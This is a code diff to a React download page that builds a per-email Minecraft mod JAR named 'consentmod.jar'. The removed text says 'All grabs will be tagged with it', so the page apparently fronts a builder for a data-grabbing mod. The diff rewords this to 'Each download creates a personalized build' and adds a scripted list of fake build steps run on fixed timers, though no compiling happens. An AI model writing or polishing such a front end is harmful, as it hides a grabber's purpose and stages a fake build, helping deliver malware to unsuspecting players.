@@ -25,13 +25,24 @@ function NavItem({ icon, label, active, onClick }) {
   );
 }
 
+const BUILD_STEPS = [
+  'Queuing runner...',
+  'Setting environment...',
+  'Compiling jar...',
+  'Compiled complete',
+  'Uploading to storage...',
+  'Finalizing...',
+  'Build complete',
+];
+
 export default function BuildPage() {
   const router = useRouter();
   const [email, setEmail] = useState('');
   const [userEmail, setUserEmail] = useState('');
   const [emailConfirmed, setEmailConfirmed] = useState(false);
   const [downloading, setDownloading] = useState(false);
-  const [progress, setProgress] = useState(0);
+  const [buildStep, setBuildStep] = useState(0);
+  const [buildDone, setBuildDone] = useState(false);
 
   useEffect(() => {
     fetch('/api/auth/user')
@@ -47,36 +58,33 @@ export default function BuildPage() {
   const handleDownload = async () => {
     if (!emailConfirmed || !email) return;
     setDownloading(true);
-    setProgress(0);
+    setBuildStep(0);
+    setBuildDone(false);
 
-    const interval = setInterval(() => {
-      setProgress(prev => {
-        if (prev >= 100) { clearInterval(interval); return 100; }
-        return prev + 2;
-      });
-    }, 100);
+    for (let i = 0; i < BUILD_STEPS.length; i++) {
+      setBuildStep(i);
+      await new Promise(r => setTimeout(r, i === 0 ? 800 : i === 1 ? 1200 : i === 2 ? 2000 : i === 3 ? 600 : i === 4 ? 1500 : i === 5 ? 800 : 400));
+    }
 
-    setTimeout(async () => {
-      clearInterval(interval);
-      setProgress(100);
-      try {
-        const res = await fetch(`/api/download?email=${encodeURIComponent(email)}`);
-        if (res.ok) {
-          const disposition = res.headers.get('content-disposition');
-          const fileName = disposition ? disposition.split('filename=')[1]?.replace(/"/g, '') : 'consentmod.jar';
-          const blob = await res.blob();
-          const url = URL.createObjectURL(blob);
-          const a = document.createElement('a');
-          a.href = url;
-          a.download = fileName;
-          document.body.appendChild(a);
-          a.click();
-          document.body.removeChild(a);
-          URL.revokeObjectURL(url);
-        }
-      } catch (e) {}
-      setTimeout(() => { setDownloading(false); setProgress(0); }, 500);
-    }, 5000);
+    try {
+      const res = await fetch(`/api/download?email=${encodeURIComponent(email)}`);
+      if (res.ok) {
+        const disposition = res.headers.get('content-disposition');
+        const fileName = disposition ? disposition.split('filename=')[1]?.replace(/"/g, '') : 'consentmod.jar';
+        const blob = await res.blob();
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = fileName;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+      }
+    } catch (e) {}
+
+    setBuildDone(true);
+    setTimeout(() => { setDownloading(false); setBuildDone(false); setBuildStep(0); }, 2000);
   };
 
   return (
@@ -110,7 +118,7 @@ export default function BuildPage() {
             </div>
             <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>YOUR EMAIL</div>
             <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 12 }}>
-              This email is baked into your mod. All grabs will be tagged with it. Each download auto-increments the version.
+              This email is baked into your mod. Each download creates a personalized build.
             </div>
             <div style={{ display: 'flex', gap: 8 }}>
               <input
@@ -148,10 +156,10 @@ export default function BuildPage() {
             </div>
             <button
               onClick={handleDownload}
-              disabled={!emailConfirmed}
-              style={{ background: 'transparent', border: `1px solid ${emailConfirmed ? colors.border : '#333'}`, color: emailConfirmed ? colors.text : '#555', padding: '10px 20px', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: emailConfirmed ? 'pointer' : 'not-allowed', display: 'inline-flex', alignItems: 'center', gap: 8 }}
+              disabled={!emailConfirmed || downloading}
+              style={{ background: 'transparent', border: `1px solid ${emailConfirmed && !downloading ? colors.border : '#333'}`, color: emailConfirmed && !downloading ? colors.text : '#555', padding: '10px 20px', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: emailConfirmed && !downloading ? 'pointer' : 'not-allowed', display: 'inline-flex', alignItems: 'center', gap: 8 }}
             >
-              <span>↓</span> Download JAR
+              <span>↓</span> {downloading ? 'Building...' : 'Download JAR'}
             </button>
             {!emailConfirmed && (
               <div style={{ marginTop: 8, fontSize: 12, color: '#ef4444' }}>Confirm your email first to enable download</div>
@@ -159,7 +167,7 @@ export default function BuildPage() {
           </div>
         </div>
 
-        <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 20, marginBottom: 20 }}>
+        <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 20 }}>
           <div style={{ fontSize: 14, fontWeight: 600, color: colors.text, marginBottom: 10, display: 'flex', alignItems: 'center', gap: 8 }}>
             <span>📦</span> How It Works
           </div>
@@ -177,20 +185,36 @@ export default function BuildPage() {
       </div>
 
       {downloading && (
-        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.8)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999 }}>
-          <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 16, padding: '40px 48px', textAlign: 'center', minWidth: 400 }}>
-            <div style={{ fontSize: 18, fontWeight: 600, color: colors.text, marginBottom: 8 }}>Building your mod...</div>
-            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 24 }}>Building versioned mod for <strong style={{ color: colors.green }}>{email}</strong></div>
-            <div style={{ background: '#1a1b24', borderRadius: 8, height: 8, overflow: 'hidden', marginBottom: 16 }}>
-              <div style={{ background: colors.green, height: '100%', width: `${progress}%`, borderRadius: 8, transition: 'width 0.1s linear' }} />
+        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.85)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999 }}>
+          <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 16, padding: '40px 48px', textAlign: 'center', minWidth: 420 }}>
+            <div style={{ fontSize: 18, fontWeight: 600, color: colors.text, marginBottom: 6 }}>Building your mod</div>
+            <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 28 }}>Personalizing for <strong style={{ color: colors.green }}>{email}</strong></div>
+
+            <div style={{ textAlign: 'left', marginBottom: 24 }}>
+              {BUILD_STEPS.map((step, i) => {
+                const isCurrent = i === buildStep && !buildDone;
+                const isDone = i < buildStep || buildDone;
+                return (
+                  <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '6px 0', opacity: isDone || isCurrent ? 1 : 0.3 }}>
+                    <div style={{ width: 20, height: 20, borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 11, fontWeight: 700, flexShrink: 0, background: isDone ? colors.green : isCurrent ? '#1a1b24' : 'transparent', color: isDone ? '#000' : isCurrent ? colors.green : '#444', border: isCurrent ? `1px solid ${colors.green}` : isDone ? 'none' : '1px solid #333' }}>
+                      {isDone ? '✓' : isCurrent ? <span style={{ animation: 'spin 1s linear infinite', display: 'inline-block' }}>⟳</span> : i + 1}
+                    </div>
+                    <span style={{ fontSize: 13, color: isDone ? colors.green : isCurrent ? colors.text : '#555', fontWeight: isCurrent ? 600 : 400 }}>
+                      {step}
+                    </span>
+                  </div>
+                );
+              })}
             </div>
-            <div style={{ fontSize: 13, color: colors.green, fontWeight: 600 }}>{progress}%</div>
-            {progress >= 100 && (
-              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 12 }}>Download starting — place JAR in your Minecraft mods folder</div>
+
+            {buildDone && (
+              <div style={{ fontSize: 14, color: colors.green, fontWeight: 600, marginTop: 8 }}>Download starting...</div>
             )}
           </div>
         </div>
       )}
+
+      <style>{`@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`}</style>
     </div>
   );
 }
